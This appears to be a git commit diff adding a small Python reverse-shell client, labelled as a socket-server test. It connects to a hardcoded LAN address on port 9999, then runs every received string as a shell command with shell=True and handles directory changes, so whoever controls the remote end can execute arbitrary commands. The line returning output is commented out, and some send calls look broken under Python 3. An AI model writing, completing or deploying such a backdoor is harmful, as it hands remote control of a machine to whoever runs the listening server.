7bc23aa13ee64eee60cf2d0e1b0a476575ead9c9
Christian Goehler <christiangoehler@Christians-iMac.local>
2017-12-04 20:17:01 +0100

    init2

---
+++ socket_client.py
@@ -0,0 +1,30 @@
+#coding:utf-8
+#socket_client.py
+#Christian Göhler
+#02.12.2017
+#Client für Socket Server -Testfunktion
+
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = '192.168.0.103'
+port = 9999
+
+s.connect((host,port))
+
+while True:
+    data = s.recv(1024)
+    s.send ('Helloo23')
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+        
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() +"> "
+        #s.send(str.encode(output_str + currentWD))
+        s.send ('Helloo')
+        print(output_str)
